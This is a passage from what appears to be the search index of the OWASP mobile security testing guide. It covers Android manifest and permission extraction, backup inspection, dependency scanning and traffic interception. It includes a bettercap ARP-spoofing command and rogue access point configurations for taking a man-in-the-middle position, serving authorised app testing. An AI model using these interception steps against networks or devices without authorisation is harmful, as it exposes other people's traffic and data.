by unzipping it. To properly analyze the manifest, you first need to extract and decode it into a human-readable XML format.</p> <p>Different tools extract the manifest in various formats, with some preserving more raw structure while others interpret or modify it during decoding.</p>","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0117/#using-jadx","title":"Using  jadx","text":"<p>Use jadx CLI with <code>--no-src</code> to extract only resources without decompiling all sources:</p> <pre><code>jadx --no-src -d out_dir MASTG-DEMO-0001.apk\n</code></pre> <p>jadx outputs the manifest in full to <code>out_dir/resources/AndroidManifest.xml</code>, including the <code>&lt;uses-sdk&gt;</code> element which is not included when using other tools like apktool.</p> <pre><code>&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;\n&lt;manifest xmlns:android=\"http://schemas.android.com/apk/res/android\" ...&gt;\n    &lt;uses-sdk\n        android:minSdkVersion=\"29\"\n        android:targetSdkVersion=\"35\" /&gt;\n</code></pre>","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0117/#using-apktool","title":"Using  Apktool","text":"<p>The AndroidManifest can be extracted using apktool:</p> <pre><code>$ apktool d -s -f -o output_dir MASTG-DEMO-0001.apk\nI: Using Apktool 2.11.1 on MASTG-DEMO-0001.apk with 8 threads\nI: Copying raw classes.dex file...\n...\nI: Loading resource table...\nI: Decoding file-resources...\nI: Decoding values */* XMLs...\nI: Decoding AndroidManifest.xml with resources...\n</code></pre> <p><code>-s</code> skips baksmaliing the dex files and is faster.</p> <p>The AndroidManifest.xml is extracted and decoded to <code>output_dir/AndroidManifest.xml</code>, where you can simply open and view it.</p> <p>When you decode an APK with apktool, you might notice that the <code>&lt;uses\u2011sdk&gt;</code> element (which includes <code>minSdkVersion</code> and <code>targetSdkVersion</code>) is missing from the decompiled AndroidManifest.xml. That's expected behavior.</p> <p>Apktool moves those values into a separate file called apktool.yml rather than inserting them into the decoded XML manifest. In that file you'll see something like:</p> <pre><code>sdkInfo:\n  minSdkVersion: 29\n  targetSdkVersion: 35\n</code></pre>","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0117/#using-aapt2","title":"Using  aapt2","text":"<p>If you are only interested in specific values of the manifest, you can use aapt2.</p> <p>Note that the output is not an XML file.</p> <pre><code>$ aapt2 d badging MASTG-DEMO-0001.apk\npackage: name='org.owasp.mastestapp' versionCode='1' versionName='1.0' platformBuildVersionName='15' platformBuildVersionCode='35' compileSdkVersion='35' compileSdkVersionCodename='15'\nsdkVersion:'29'\ntargetSdkVersion:'35'\nuses-permission: name='android.permission.INTERNET'\nuses-permission: name='org.owasp.mastestapp.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION'\napplication-label:'MASTestApp'\n...\n</code></pre>","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0126/","title":"MASTG-TECH-0126: Obtaining App Permissions","text":"<p>Android permissions are declared in the <code>AndroidManifest.xml</code> file using the <code>&lt;uses-permission&gt;</code> tag. You can use multiple tools to view them.</p>","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0126/#using-the-androidmanifest","title":"Using the AndroidManifest","text":"<p>Extract the <code>AndroidManifest.xml</code> as explained in  Obtaining Information from the AndroidManifest and retrieve all <code>&lt;uses-permission&gt;</code> elements.</p>","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0126/#using-aapt2","title":"Using  aapt2","text":"<p><code>aapt</code> can be used to view the permissions requested by an application.</p> <pre><code>$ aapt d permissions org.owasp.mastestapp.apk\npackage: org.owasp.mastestapp\nuses-permission: name='android.permission.INTERNET'\nuses-permission: name='android.permission.CAMERA'\nuses-permission: name='android.permission.WRITE_EXTERNAL_STORAGE'\nuses-permission: name='android.permission.READ_CONTACTS'\nuses-permission: name='android.permission.READ_EXTERNAL_STORAGE'\nuses-permission: name='org.owasp.mastestapp.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION'\n</code></pre>","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0126/#using-adb","title":"Using  adb","text":"<p><code>adb</code> can be used to view the permissions requested by an application. It also shows the status of the permissions (granted or denied) at runtime.</p> <pre><code>$ adb shell dumpsys package org.owasp.mastestapp | grep permission\n    declared permissions:\n    requested permissions:\n      android.permission.INTERNET\n      android.permission.CAMERA\n      android.permission.WRITE_EXTERNAL_STORAGE\n      android.permission.READ_CONTACTS\n      android.permission.READ_EXTERNAL_STORAGE\n    install permissions:\n      android.permission.INTERNET: granted=true\n      runtime permissions:\n        android.permission.READ_EXTERNAL_STORAGE: granted=false, flags=[ RESTRICTION_INSTALLER_EXEMPT]\n        android.permission.CAMERA: granted=false\n        android.permission.WRITE_EXTERNAL_STORAGE: granted=false, flags=[ RESTRICTION_INSTALLER_EXEMPT]\n        android.permission.READ_CONTACTS: granted=false\n</code></pre>","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0127/","title":"MASTG-TECH-0127: Inspecting an App's Backup Data","text":"<p>You can inspect an Android app's backup data to verify that sensitive data is not included in the backup. This technique is useful for verifying that the app correctly excludes sensitive data from backups.</p>","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0127/#backup-made-via-adb-backup","title":"Backup Made via ADB Backup","text":"<p>Android backups are stored in <code>.ab</code> files, which are specially formatted TAR archives. If you followed the steps from  Performing a Backup and Restore of App Data, you should have an <code>apps/</code> directory in your working directory. This directory contains the extracted backup data.</p> <p>The files are stored within top-level directories according to their semantic origin:</p> <ul> <li><code>apps/pkgname/a/</code>: Application .apk file itself</li> <li><code>apps/pkgname/obb/</code>: The application's associated .obb containers</li> <li><code>apps/pkgname/f/</code>: The subtree rooted at the <code>getFilesDir()</code> location</li> <li><code>apps/pkgname/db/</code>: The subtree rooted at the <code>getDatabasePath()</code> parent</li> <li><code>apps/pkgname/sp/</code>: The subtree rooted at the <code>getSharedPrefsFile()</code> parent</li> <li><code>apps/pkgname/r/</code>: Files stored relative to the root of the app's file tree</li> <li><code>apps/pkgname/c/</code>: Reserved for the app's <code>getCacheDir()</code> tree; not stored.</li> </ul>","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0128/","title":"MASTG-TECH-0128: Performing a Backup and Restore of App Data","text":"","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0128/#using-the-backup-manager-via-adb-shell","title":"Using the Backup Manager (via ADB shell)","text":"<p>Run Backup Manager (<code>adb shell bmgr</code>)</p> <p>{{ ../../utils/mastg-android-backup-bmgr.sh }}</p> <p>When using the cloud transport variant, each app's backup is managed and stored independently in the user's Google Drive. In our case we're interested in the local transport variant, where <code>bmgr</code> stores each app's backup data in a separate <code>.ab</code> file within the <code>/data/data/com.android.localtransport/files/</code> directory on the device. To extract the file run:</p> <pre><code>adb root\nadb pull /data/data/com.android.localtransport/files/1/_full/org.owasp.mastestapp org.owasp.mastestapp.ab\ntar xvf org.owasp.mastestapp.ab\n</code></pre> <p>The extracted backup directory (<code>apps/</code>) is stored in the current working directory. For instructions on how to inspect it, see  Inspecting an App's Backup Data.</p>","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0128/#using-adb-backup","title":"Using ADB Backup","text":"<p>Warning</p> <p><code>adb backup</code> is restricted since Android 12 and requires <code>android:debuggable=true</code> in the AndroidManifest.xml.</p> <p>You can run <code>adb backup</code> to back up the app data. Approve the backup from your device by selecting the Back up my data option. After the backup process is finished, the file .ab will be in your working directory.</p> <p>{{ ../../utils/mastg-android-backup-adb.sh }}</p> <p>The extracted backup directory (<code>apps/</code>) is stored in the current working directory. For instructions on how to inspect it, see  Inspecting an App's Backup Data.</p> <p>Note: The behavior might differ between an emulator and a physical device.</p>","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0128/#using-android-backup-extractor","title":"Using Android Backup Extractor","text":"<p>You can use Android Backup Extractor to extract the backup data. For more information, refer to its GitHub repo.</p>","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0129/","title":"MASTG-TECH-0129: Verifying Android Dependencies at Runtime","text":"<p>The preferred techniques for analyzing dependencies are  Software Composition Analysis (SCA) of Android Dependencies at Build Time and  Software Composition Analysis (SCA) of Android Dependencies by Creating a SBOM. This technique, which is described here, should only be used in a black-box environment because it is manual and cannot easily be automated.</p> <p>When analyzing an application, it's important to analyze its dependencies, which are usually in the form of libraries, and ensure that they don't contain any known vulnerabilities. If the source code is unavailable, you can decompile the application and check the JAR files. If  Proguard or other obfuscation tools are used properly, the version information about the library is often obfuscated. Otherwise, this information may still be found in the comments of the Java files of the given libraries. Tools such as  blint can help analyze the possible libraries packaged with the application. If you can determine the library's version, either from the comments or from specific methods used in certain versions, you can manually search for CVEs.</p>","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0130/","title":"MASTG-TECH-0130: Software Composition Analysis (SCA) of Android Dependencies by Creating a SBOM","text":"<p> cdxgen can be used to create a so called Software Bill of Material (SBOM) in the CycloneDX format. Navigate to the root directory of the Android Studio project you want to scan and execute the following command:</p> <pre><code>$ cdxgen -t java -o sbom.json\n</code></pre> <p>The created SBOM file need to be Base64 encoded and can then be uploaded to  dependency-track for analysis:</p> <pre><code>$ cat sbom.json | base64\n$ curl -X \"PUT\" \"http://localhost:8081/api/v1/bom\" \\\n     -H 'Content-Type: application/json' \\\n     -H 'X-API-Key: &lt;YOUR API KEY&gt;&gt;' \\\n     -d $'{\n  \"project\": \"&lt;YOUR PROJECT ID&gt;\",\n  \"bom\": \"&lt;BASE64-ENCODED SBOM&gt;\"\n  }'\n</code></pre> <p>Go to the frontend of dependency-check, which is http://localhost:8080, if you are using the default settings of the dependency-track docker container. Open the project you uploaded the SBOM to and you can verify if there are any vulnerable dependencies.</p> <p>Note: Transitive dependencies are supported by  dependency-track for Java and Kotlin.</p>","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0131/","title":"MASTG-TECH-0131: Software Composition Analysis (SCA) of Android Dependencies at Build Time","text":"<p>Modern Android applications rely heavily on third-party libraries, making dependency security a critical concern. Software Composition Analysis (SCA) tools inspect dependency metadata, such as package names and versions, and compare it against public vulnerability databases, like the National Vulnerability Database (NVD), to help identify known vulnerabilities.</p> <p>In Android development, dependencies are resolved and compiled during the build process and eventually become part of the app's DEX files. Therefore, it is essential to scan dependencies as they appear in the build environment, not just within the final APK. This approach ensures that all libraries, including transitive ones, are analyzed accurately.</p> <p>Since dependencies are declared and resolved in the build environment, integrating SCA tools into the build system is the most effective strategy. Gradle is especially relevant in this context because it is the default build tool used by Android Studio and the most common dependency management system in Android projects.</p>","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0131/#using-dependency-check","title":"Using  dependency-check","text":"<p>To test for dependencies with known vulnerabilities, integrate the dependency-check plugin into the Android project via Gradle. The Android project's dependencies are located in the directory <code>~/.gradle/caches/modules-2/files-2.1</code> and not in the Android project directory.</p> <p>Before running the scan, obtain an API key for NVD to retrieve the latest CVE information. You can request the API key to access the NVD API from https://nvd.nist.gov/developers/request-an-api-key.</p> <p>Info</p> <p>In recent versions of  dependency-check (up to and including version 12.1.1 at the time of writing), you may encounter multiple 'NoSuchMethodError' messages related to <code>ZipFile.builder()</code>. This can be resolved by pinning the version of <code>org.apache.commons:commons-compress</code>.</p> <p>In the <code>build.gradle</code> of <code>Module: app</code> (not the project <code>build.gradle</code> file), add the <code>dependencycheck</code> dependency in the latest version and the <code>dependencyCheck</code> configuration:</p> <pre><code>plugins {\n    ...\n    id(\"org.owasp.dependencycheck\") version \"12.1.1\" // This is the latest version at the time of writing, please update accordingly\n}\n\ndependencyCheck {\n\n    formats = listOf(\"HTML\", \"XML\", \"JSON\") // Generate reports in HTML, JSON and XML format\n\n    nvd {\n        apiKey = \"&lt;YOUR NVD API KEY&gt;\"\n        delay = 16000\n    }\n\n}\n</code></pre> <p>Open a terminal in Android Studio and execute the following command:</p> <pre><code>$ ./gradlew dependencyCheckAnalyze\n...\nBUILD SUCCESSFUL in 6s\n1 actionable task: 1 executed\n</code></pre> <p>The report was generated in 3 different formats (HTML, JSON and XML) and can be found in the project directory in <code>app/build/reports</code>.</p> <p>Suppressing False Positives:</p> <p>If there are dependencies that you want to suppress because they are false positives or are not included in the APK but might be necessary for building the APK, you can use a suppression file. The following <code>suppression.xml</code> would exclude all vulnerabilities from the package URLs <code>pkg:maven/io.grpc/grpc.*</code> and <code>pkg:maven/io.netty/netty.*</code>:</p> <pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;suppressions xmlns=\"https://jeremylong.github.io/DependencyCheck/dependency-suppression.1.3.xsd\"&gt;\n    &lt;suppress&gt;\n        &lt;notes&gt;&lt;![CDATA[\n        This suppresses false positives identified on grpc that are not added into the APK.\n        ]]&gt;&lt;/notes&gt;\n        &lt;packageUrl regex=\"true\"&gt;^pkg:maven/io\\.grpc/grpc.*&lt;/packageUrl&gt;\n        &lt;vulnerabilityName regex=\"true\"&gt;.*&lt;/vulnerabilityName&gt;\n    &lt;/suppress&gt;\n\n    &lt;suppress&gt;\n        &lt;notes&gt;&lt;![CDATA[\n        This suppresses false positives identified on netty that are not added into the APK.\n        ]]&gt;&lt;/notes&gt;\n        &lt;packageUrl regex=\"true\"&gt;^pkg:maven/io\\.netty/netty.*&lt;/packageUrl&gt;\n        &lt;vulnerabilityName regex=\"true\"&gt;.*&lt;/vulnerabilityName&gt;\n    &lt;/suppress&gt;\n\n&lt;/suppressions&gt;\n</code></pre> <p>To use the <code>suppression.xml</code> file, add the following line to your <code>build.gradle.kts</code> file:</p> <pre><code>dependencyCheck {\n\n    formats = listOf(\"HTML\", \"XML\", \"JSON\") // Generate reports in HTML, JSON and XML format\n\n    suppressionFile = \"suppression.xml\"\n    ...\n</code></pre> <p>Further examples of suppressing false positives can be found here.</p>","tags":["android","tech"]},{"location":"MASTG/techniques/generic/MASTG-TECH-0047/","title":"MASTG-TECH-0047: Reverse Engineering","text":"<p>Reverse engineering is the process of taking an app apart to find out how it works. You can do this by examining the compiled app (static analysis), observing the app during runtime (dynamic analysis), or a combination of both.</p>","tags":["generic","tech"]},{"location":"MASTG/techniques/generic/MASTG-TECH-0048/","title":"MASTG-TECH-0048: Static Analysis","text":"<p>For white-box source code testing, you'll need a setup similar to the developer's setup, including a test environment that includes the Android SDK and an IDE. Access to either a physical device or an emulator (for debugging the app) is recommended.</p> <p>During black-box testing, you won't have access to the original form of the source code. You'll usually have the application package in Android's APK format, which can be installed on an Android device or reverse engineered as explained in  Decompiling Java Code.</p>","tags":["generic","tech"]},{"location":"MASTG/techniques/generic/MASTG-TECH-0049/","title":"MASTG-TECH-0049: Dynamic Analysis","text":"<p>Dynamic Analysis tests the mobile app by executing and running the app binary and analyzing its workflows for vulnerabilities. For example, vulnerabilities regarding data storage might be sometimes hard to catch during static analysis, but in dynamic analysis you can easily spot what information is stored persistently and if the information is protected properly. Besides this, dynamic analysis allows the tester to properly identify:</p> <ul> <li>Business logic flaws</li> <li>Vulnerabilities in the tested environments</li> <li>Improper input validation and bad input/output encoding as they are processed through one or multiple services</li> </ul> <p>Analysis can be assisted by automated tools, such as  MobSF, while assessing an application. An application can be assessed by side-loading it, re-packaging it, or by simply attacking the installed version.</p>","tags":["generic","tech"]},{"location":"MASTG/techniques/generic/MASTG-TECH-0049/#basic-information-gathering","title":"Basic Information Gathering","text":"<p>As mentioned previously, Android runs on top of a modified Linux kernel and retains the proc filesystem (procfs) from Linux, which is mounted at <code>/proc</code>. Procfs provides a directory-based view of a process running on the system, providing detailed information about the process itself, its threads, and other system-wide diagnostics. Procfs is arguably one of the most important filesystems on Android, where many OS native tools depend on it as their source of information.</p> <p>Many command line tools are not shipped with the Android firmware to reduce the size, but can be easily installed on a rooted device using  Busybox. We can also create our own custom scripts using commands like <code>cut</code>, <code>grep</code>, <code>sort</code> etc, to parse the proc filesystem information.</p> <p>In this section, we will be using information from procfs directly or indirectly to gather information about a running process.</p>","tags":["generic","tech"]},{"location":"MASTG/techniques/generic/MASTG-TECH-0050/","title":"MASTG-TECH-0050: Binary Analysis","text":"<p>Binary analysis frameworks give you powerful ways to automate tasks that would be almost impossible to do manually. Binary analysis frameworks typically use a technique called symbolic execution, which allow to determine the conditions necessary to reach a specific target. It translates the program's semantics into a logical formula in which some variables are represented by symbols with specific constraints. By resolving the constraints, you can find the conditions necessary for the execution of some branch of the program.</p>","tags":["generic","tech"]},{"location":"MASTG/techniques/generic/MASTG-TECH-0051/","title":"MASTG-TECH-0051: Tampering and Runtime Instrumentation","text":"<p>First, we'll look at some simple ways to modify and instrument mobile apps. Tampering means making patches or runtime changes to the app to affect its behavior. For example, you may want to deactivate SSL pinning or binary protections that hinder the testing process. Runtime Instrumentation encompasses adding hooks and runtime patches to observe the app's behavior. In mobile application security however, the term loosely refers to all kinds of runtime manipulation, including overriding methods to change behavior.</p>","tags":["generic","tech"]},{"location":"MASTG/techniques/generic/MASTG-TECH-0119/","title":"MASTG-TECH-0119: Intercepting HTTP Traffic by Hooking Network APIs at the Application Layer","text":"<p>Depending on your goal while testing the app, sometimes it is enough to monitor the traffic before it reaches the network layer or when the responses are received in the app.</p> <p>This means that you don't need to deploy a fully fledged MITM attack (including ARP Spoofing attacks, etc.) if you simply want to determine if certain sensitive data is being transmitted to the network. With this approach, you will not interfere with any TLS verification or pinning.</p> <p>You can use Frida as an alternative</p> <p>This technique is also useful for:</p> <ul> <li>Intercepting traffic in apps that use custom network stacks.</li> <li>Intercepting traffic in apps built with specific cross-platform frameworks such as Flutter.<ul> <li>Android:  Intercepting Flutter HTTPS Traffic</li> <li>iOS:  Intercepting Flutter HTTPS Traffic</li> </ul> </li> <li>Intercepting other types of traffic such as BLE, NFC, etc., where deploying a MITM attack might be very costly and complex.</li> <li>Analyzing protocols like MQTT and CoAP, which may require more specialized interception techniques.</li> <li>Monitoring WebSocket traffic, which can also necessitate unique interception strategies.</li> </ul> <p>You just have to hook the right functions, e.g., <code>SSL_write</code> and <code>SSL_read</code> from OpenSSL.</p> <p>This would work pretty well for apps using standard API library functions and classes; however, there might be some downsides:</p> <ul> <li>The app might implement a custom network stack and you'll have to spend time analyzing the app to find out the APIs that you can use. See section \"Searching for OpenSSL traces with signature analysis\" in this blog post.</li> <li>It might be very time consuming to craft the right hooking scripts to re-assemble HTTP response pairs (across many method calls and execution threads). You might find ready-made scripts and even for alternative network stacks, but depending on the app and the platform, these scripts might need a lot of maintenance and might not always work.</li> </ul> <p>See some examples:</p> <ul> <li>\"Universal interception. How to bypass SSL Pinning and monitor traffic of any application\", sections \"Grabbing payload prior to transmission\" and \"Grabbing payload prior to encryption\"</li> <li>\"Frida as an Alternative to Network Tracing\"</li> </ul>","tags":["generic","tech"]},{"location":"MASTG/techniques/generic/MASTG-TECH-0120/","title":"MASTG-TECH-0120: Intercepting HTTP Traffic Using an Interception Proxy","text":"<p>Interception proxies are the most common method for intercepting mobile app traffic. They work by setting up a proxy server that intercepts and logs all HTTP/HTTPS traffic between the mobile app and the server. This allows you to view and modify the requests and responses in real-time.</p> <p>Several free and commercial proxy tools are available. For example:  mitmproxy,  Burp Suite and  ZAP.</p>","tags":["generic","tech"]},{"location":"MASTG/techniques/generic/MASTG-TECH-0120/#rerouting-traffic-to-the-proxy","title":"Rerouting Traffic to the Proxy","text":"<p>To use the interception proxy, you'll need to run it on your host computer and configure the mobile app to route HTTP(S) requests to your proxy. In most cases, it is enough to set a system-wide proxy in the network settings of the mobile device - if the app uses standard HTTP APIs or popular libraries such as <code>okhttp</code>, it will automatically use the system settings.</p> <p></p>","tags":["generic","tech"]},{"location":"MASTG/techniques/generic/MASTG-TECH-0120/#installing-the-proxy-certificate","title":"Installing the Proxy Certificate","text":"<p>Using an interception proxy breaks SSL certificate verification and the app will usually fail to initiate TLS connections. Because of this, interception proxies require you to install a custom CA certificate on the mobile device, which allows the proxy to decrypt and inspect the encrypted HTTPS traffic. Depending on the platform, the installed certificate may or may not be automatically trusted by the application. Additionally, some apps implement certificate pinning, which requires additional effort to bypass.</p>","tags":["generic","tech"]},{"location":"MASTG/techniques/generic/MASTG-TECH-0120/#per-platform-instructions","title":"Per-Platform Instructions","text":"<ul> <li>Android: see  Setting Up an Interception Proxy</li> <li>iOS: see  Setting up an Interception Proxy</li> </ul>","tags":["generic","tech"]},{"location":"MASTG/techniques/generic/MASTG-TECH-0121/","title":"MASTG-TECH-0121: Intercepting Non-HTTP Traffic Using an Interception Proxy","text":"<p>Interception proxies such as  Burp Suite and  ZAP won't show non-HTTP traffic, because they aren't capable of decoding it properly by default. They can, however, be extended using the following tools, allowing you to intercept and manipulate non-HTTP traffic:</p> <ul> <li>Burp-non-HTTP-Extension and</li> <li>Mitm-relay.</li> </ul> <p>Note that this setup can sometimes become very tedious and is not as straightforward as testing HTTP.</p>","tags":["generic","tech"]},{"location":"MASTG/techniques/generic/MASTG-TECH-0122/","title":"MASTG-TECH-0122: Passive Eavesdropping","text":"<p>This method involves passively capturing network traffic using tools such as  Wireshark,  tcpdump, or  Android tcpdump. It is useful for identifying network endpoints, analyzing protocol metadata, and understanding how an app communicates with its server. However, it cannot automatically decrypt TLS-encrypted communication. That said, TLS decryption is possible if you can obtain the pre-master secret. For an example specific to Android, see this article.</p>","tags":["generic","tech"]},{"location":"MASTG/techniques/generic/MASTG-TECH-0122/#when-is-it-useful","title":"When Is it Useful?","text":"<p>Passive eavesdropping is particularly useful in the following scenarios:</p> <ul> <li>Troubleshooting active MITM issues: Identifying TLS handshake errors, certificate validation failures, and routing anomalies that may cause active interception techniques to fail.</li> <li>Analyzing plaintext non-HTTP traffic: Monitoring protocols such as XMPP, MQTT, DNS, SMB, and custom UDP/TCP protocols used by the app. Also useful for analyzing push notification traffic from services like Google Cloud Messaging (GCM) / Firebase Cloud Messaging (FCM) on Android or Apple Push Notification Service (APNS) on iOS.</li> <li>Analyzing traffic from non-proxy-aware apps: Some mobile apps ignore system proxy settings (e.g., those built with Xamarin) or actively detect and block MITM proxies. Passive eavesdropping allows monitoring without triggering detection mechanisms.</li> <li>Investigating network anomalies and unintended data leaks: Passive monitoring can help detect unexpected third-party communication, data leakage via DNS requests, or unusual outbound connections. Additionally, even if TLS encryption prevents direct payload inspection, metadata leaks (e.g., request size, timing patterns, domain names, or packet sequences) can still provide valuable insights and may be useful for side-channel attacks.</li> </ul>","tags":["generic","tech"]},{"location":"MASTG/techniques/generic/MASTG-TECH-0122/#how-does-it-work","title":"How Does It Work?","text":"<p>Passive eavesdropping can be performed in two ways:</p> <ol> <li> <p>Directly on a rooted Android or jailbroken iOS device    If the device is rooted (Android) or jailbroken (iOS), you can capture network traffic directly using <code>tcpdump</code> or similar tools, without needing a host computer. This allows you to monitor all outgoing and incoming packets in real time.</p> </li> <li> <p>By routing traffic through a host computer (works on both rooted/jailbroken and non-rooted/non-jailbroken devices)    If direct packet capture on the device is not possible or preferred, you can route its network traffic to a host computer and analyze it using tools like  Wireshark or  Android tcpdump. This method applies to both rooted/jailbroken and non-rooted/non-jailbroken devices and is typically achieved through:</p> </li> <li>Using an interception proxy to intercept and analyze HTTP/S traffic.</li> <li>Setting up a VPN-based capture to redirect traffic through a controlled network tunnel.</li> <li>Performing ARP spoofing or setting up a transparent network tap on a Wi-Fi network.</li> </ol>","tags":["generic","tech"]},{"location":"MASTG/techniques/generic/MASTG-TECH-0122/#per-platform-instructions","title":"Per-Platform Instructions","text":"<ul> <li>Android:  Basic Network Monitoring/Sniffing</li> <li>iOS:  Basic Network Monitoring/Sniffing</li> </ul>","tags":["generic","tech"]},{"location":"MASTG/techniques/generic/MASTG-TECH-0123/","title":"MASTG-TECH-0123: Achieving a MITM Position via ARP Spoofing","text":"<p>When proxy-based interception fails due to non-HTTP protocols or non-proxy-aware apps, ARP Spoofing can be used to redirect network traffic. ARP Spoofing is a Layer 2 attack that allows an attacker to impersonate the network gateway, forcing the mobile device to send its traffic through the attacker's machine.</p> <p>This technique works against any device and operating system as the attack is executed on OSI Layer 2. When you are MITM, you might not be able to see clear text data, as the data in transit might be encrypted by TLS, but it will give you valuable information about the hosts involved, the protocols used, and the ports the app is communicating with.</p> <p>To execute an ARP Spoofing attack, you can use  bettercap.</p> <p>Important: Modern operating systems implement defenses such as encrypted DNS (DoH, DoT), MAC address randomization, and ARP spoofing detection, making this technique less effective on newer devices.</p>","tags":["generic","tech"]},{"location":"MASTG/techniques/generic/MASTG-TECH-0123/#network-setup","title":"Network Setup","text":"<p>To achieve a Machine-in-the-Middle (MITM) position, your host computer must be on the same wireless network as the mobile device and the gateway it communicates with. Once this is set up, you need to obtain the IP address of the mobile device. For a complete dynamic analysis of a mobile app, all network traffic should be intercepted and analyzed.</p>","tags":["generic","tech"]},{"location":"MASTG/techniques/generic/MASTG-TECH-0123/#mitm-attack","title":"MITM Attack","text":"<p>Start your preferred network analyzer tool first, then start  bettercap with the following command and replace the IP address below (X.X.X.X) with the target you want to execute the MITM attack against.</p> <pre><code>$ sudo bettercap -eval \"set arp.spoof.targets X.X.X.X; arp.spoof on; set arp.spoof.internal true; set arp.spoof.fullduplex true;\"\nbettercap v2.22 (built for darwin amd64 with go1.12.1) [type 'help' for a list of commands]\n\n[19:21:39] [sys.log] [inf] arp.spoof enabling forwarding\n[19:21:39] [sys.log] [inf] arp.spoof arp spoofer started, probing 1 targets.\n</code></pre> <p>bettercap will then automatically send the packets to the network gateway in the (wireless) network and you are able to sniff the traffic. Beginning of 2019 support for full duplex ARP spoofing was added to bettercap.</p> <p>On the mobile phone start the browser and navigate to <code>http://example.com</code>, you should see output like the following when you are using Wireshark.</p> <p></p> <p>If that's the case, you are now able to see the complete network traffic that is sent and received by the mobile phone. This includes also DNS, DHCP and any other form of communication and can therefore be quite \"noisy\". You should therefore know how to use DisplayFilters in Wireshark or know how to filter in tcpdump to focus only on the relevant traffic for you.</p>","tags":["generic","tech"]},{"location":"MASTG/techniques/generic/MASTG-TECH-0124/","title":"MASTG-TECH-0124: Achieving a MITM Position Using a Rogue Access Point","text":"<p>To achieve a Machine-in-the-Middle (MITM) position, you can set up a network where all traffic between the target mobile device and the external network is routed through your host computer. This can be done in one of two ways:</p> <p>Option 1: Using an external access point: Both the mobile device and your host computer connect to a separate access point. This setup is useful for bypassing host isolation mechanisms in public or enterprise networks. Traffic from the mobile device is then redirected through your host for interception.</p> <p>The scenario with a separate access point requires access to the configuration of the AP and you should check first if the AP supports either:</p> <ul> <li>port forwarding or</li> <li>has a span or mirror port.</li> </ul> <p>Option 2: Your host as the access point: Your host computer itself acts as the access point, directly controlling network traffic. This can be configured in different ways:      - Using your host's built-in WiFi card as the access point while connecting to the target network via a wired connection.      - Using an external USB WiFi adapter as the access point while your built-in WiFi connects to the target network (or vice versa).</p> <p>First, if you're going to use an external USB WiFi card, ensure that the card has the capability to create an access point. You can verify if your WiFi card has AP capabilities by using the command <code>iwconfig</code> on Kali Linux:</p> <pre><code>iw list | grep AP\n</code></pre> <p>In both cases the AP needs to be configured to point to your host computer's IP. Your host computer must be connected to the AP (via wired connection or WiFi) and you need to have connection to the target network (can be the same connection as to the AP). Some additional configuration may be required on your host computer to route traffic to the target network.</p> <p></p>","tags":["generic","tech"]},{"location":"MASTG/techniques/generic/MASTG-TECH-0124/#installation","title":"Installation","text":"<p>The following procedure is setting up a MITM position using an access point and an additional network interface:</p> <p>Create a WiFi network either through a separate access point or through an external USB WiFi card or through the built-in card of your host computer.</p> <p>This can be done by using the built-in utilities on macOS. You can use share the internet connection on Mac with other network users.</p> <p>For all major Linux and Unix operating systems you need tools such as:</p> <ul> <li>hostapd</li> <li>dnsmasq</li> <li>iptables</li> <li>wpa_supplicant</li> <li>airmon-ng</li> </ul> <p>For Kali Linux you can install these tools with <code>apt-get</code>:</p> <pre><code>apt-get update\napt-get install hostapd dnsmasq aircrack-ng\n</code></pre> <p>iptables and wpa_supplicant are installed by default on Kali Linux.</p> <p>In case of a separate access point, route the traffic to your host computer. In case of an external USB WiFi card or built-in WiFi card the traffic is already available on your host computer.</p> <p>Route the incoming traffic coming from the WiFi to the additional network interface where the traffic can reach the target network. Additional network interface can be wired connection or other WiFi card, depending on your setup.</p>","tags":["generic","tech"]},{"location":"MASTG/techniques/generic/MASTG-TECH-0124/#configuration","title":"Configuration","text":"<p>We focus on the configuration files for Kali Linux. Following values need to be defined:</p> <ul> <li>wlan1 - id of the AP network interface (with AP capabilities),</li> <li>wlan0 - id of the target network interface (this can be wired interface or other WiFi card)</li> <li>10.0.0.0/24 - IP addresses and mask of AP network</li> </ul> <p>The following configuration files need to be changed and adjusted accordingly:</p> <ul> <li> <p>hostapd.conf</p> <pre><code># Name of the WiFi interface we use\ninterface=wlan1\n# Use the nl80211 driver\ndriver=nl80211\nhw_mode=g\nchannel=6\nwmm_enabled=1\nmacaddr_acl=0\nauth_algs=1\nignore_broadcast_ssid=0\nwpa=2\nwpa_key_mgmt=WPA-PSK\nrsn_pairwise=CCMP\n# Name of the AP network\nssid=STM-AP\n# Password of the AP network\nwpa_passphrase=password\n</code></pre> </li> <li> <p>wpa_supplicant.conf</p> <pre><code>network={\n    ssid=\"NAME_OF_THE_TARGET_NETWORK\"\n    psk=\"PASSWORD_OF_THE_TARGET_NETWORK\"\n}\n</code></pre> </li> <li> <p>dnsmasq.conf</p> <pre><code>interface=wlan1\ndhcp-range=10.0.0.10,10.0.0.250,12h\ndhcp-option=3,10.0.0.1\ndhcp-option=6,10.0.0.1\nserver=8.8.8.8\nlog-queries\nlog-dhcp\nlisten-address=127.0.0.1\n</code></pre> </li> </ul>","tags":["generic","tech"]},{"location":"MASTG/techniques/generic/MASTG-TECH-0124/#mitm-attack","title":"MITM Attack","text":"<p>To be able to get a MITM position you need to run the above configuration. This can be done by 